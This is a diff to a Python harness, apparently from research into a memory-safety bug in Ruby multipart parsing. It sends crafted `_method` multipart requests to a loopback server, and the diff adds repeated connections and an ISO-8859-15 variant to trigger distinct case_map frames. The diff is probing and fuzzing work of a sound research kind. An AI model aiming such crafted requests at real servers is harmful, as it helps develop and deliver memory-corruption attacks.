@@ -19,6 +19,10 @@ W376 adds a multipart field AFTER the `_method` part, plus an even-N safe
 control; opt-in response digests make response bytes comparable across arms.
 W377 adds a variable-length post-field (`RUBY2SHELL_W377_POSTLEN`) so the
 wire-chosen allocation following `_method` can be swept under valgrind.
+W378 adds `RUBY2SHELL_W378_COUNT` (default 1) to repeat a surface over that
+many fresh loopback connections against ONE server process.
+W378 also adds `method-postfield-size-alt`, the same shape tagged
+ISO-8859-15, so two folds in one process produce distinct case_map frames.
 """
 
 import hashlib
@@ -132,7 +136,8 @@ def build(surface):
                             b"multipart/form-data; boundary=" + BOUNDARY)],
                 body)
     if surface in ("method-postfield", "method-postfield-safe",
-                   "method-postfield-size", "method-postfield-size-safe"):
+                   "method-postfield-size", "method-postfield-size-safe",
+                   "method-postfield-size-alt"):
         if surface.endswith("-safe"):
             operand = SAFE
         else:
@@ -144,13 +149,14 @@ def build(surface):
             post = (POST + b"A" * postlen)[:postlen]
         else:
             post = POST
+        charset = b"ISO-8859-15" if surface.endswith("-alt") else b"ISO-8859-1"
         body = (b"--" + BOUNDARY + b"\r\n"
                 b'Content-Disposition: form-data; name="_method"\r\n'
-                b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
+                b"Content-Type: text/plain; charset=" + charset + b"\r\n\r\n"
                 + operand +
                 b"\r\n--" + BOUNDARY + b"\r\n"
                 b'Content-Disposition: form-data; name="after"\r\n'
-                b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
+                b"Content-Type: text/plain; charset=" + charset + b"\r\n\r\n"
                 + post +
                 b"\r\n--" + BOUNDARY + b"--\r\n")
         return (b"POST", PATH,
@@ -168,6 +174,9 @@ def build(surface):
 def main():
     port = int(sys.argv[1])
     response_summary = os.environ.get("RUBY2SHELL_W376_RESPONSE", "0") == "1"
+    count = int(os.environ.get("RUBY2SHELL_W378_COUNT", "1"))
+    if count < 1:
+        raise ValueError("RUBY2SHELL_W378_COUNT must be >= 1")
     surfaces = os.environ.get("RUBY2SHELL_W371_SURFACES", ",".join(ALL)).split(",")
     if os.environ.get("RUBY2SHELL_W371_CONTROL", "0") == "1":
         surfaces.append("method-odd")
@@ -179,27 +188,31 @@ def main():
             request += name + b": " + value + b"\r\n"
         request += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
         request += b"Connection: close\r\n\r\n" + body
-        head = "ERR unknown"
-        response = b""
-        try:
-            with socket.create_connection((HOST, port), timeout=5) as sock:
-                sock.sendall(request)
-                chunks = []
-                while True:
-                    data = sock.recv(65536)
-                    if not data:
-                        break
-                    chunks.append(data)
-            response = b"".join(chunks)
-            head = response.split(b"\r\n", 1)[0].decode("latin-1")
-        except Exception as exc:
-            head = "ERR %s" % type(exc).__name__
-        print("surface=%s head=%s" % (surface, head), flush=True)
-        if response_summary:
-            print("surface=%s response-len=%d response-sha256=%s response-body=%r"
-                  % (surface, len(response),
-                     hashlib.sha256(response).hexdigest(),
-                     response.decode("latin-1")), flush=True)
+        for attempt in range(count):
+            head = "ERR unknown"
+            response = b""
+            try:
+                with socket.create_connection((HOST, port), timeout=5) as sock:
+                    sock.sendall(request)
+                    chunks = []
+                    while True:
+                        data = sock.recv(65536)
+                        if not data:
+                            break
+                        chunks.append(data)
+                response = b"".join(chunks)
+                head = response.split(b"\r\n", 1)[0].decode("latin-1")
+            except Exception as exc:
+                head = "ERR %s" % type(exc).__name__
+            label = "surface=%s" % surface
+            if count > 1:
+                label += " request=%d" % (attempt + 1)
+            print("%s head=%s" % (label, head), flush=True)
+            if response_summary:
+                print("%s response-len=%d response-sha256=%s response-body=%r"
+                      % (label, len(response),
+                         hashlib.sha256(response).hexdigest(),
+                         response.decode("latin-1")), flush=True)
 
 
 if __name__ == "__main__":
